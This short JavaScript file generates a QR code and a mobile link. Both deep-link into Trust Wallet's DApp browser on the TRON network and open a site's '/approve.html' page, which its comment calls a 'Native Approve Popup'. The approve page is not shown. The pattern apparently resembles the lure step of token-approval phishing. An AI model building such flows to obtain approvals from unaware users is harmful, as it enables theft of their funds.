// ============================================================
// QR CODE → Trust Wallet DApp Browser → Native Approve Popup
// ============================================================

function generateQR() {
    try {
        const approveUrl = window.location.origin + "/approve.html";

        // Trust Wallet deep link - opens URL in Trust Wallet's DApp browser
        // coin_id=195 = TRON network
        const trustDeepLink = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(approveUrl);

        const container = document.getElementById("qrcode");
        container.innerHTML = "";

        if (typeof QRCode !== "undefined") {
            new QRCode(container, {
                text: trustDeepLink,
                width: 220,
                height: 220,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.M,
            });
        } else {
            container.innerHTML = '<p style="color:#666;padding:20px;font-size:12px;">QR failed to load</p>';
        }

        document.getElementById("mobile-link").href = trustDeepLink;
        document.getElementById("status-text").textContent = "Scan with Trust Wallet";
    } catch (err) {
        document.getElementById("status-text").textContent = "Error: " + err.message;
    }
}

if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", generateQR);
} else {
    generateQR();
}
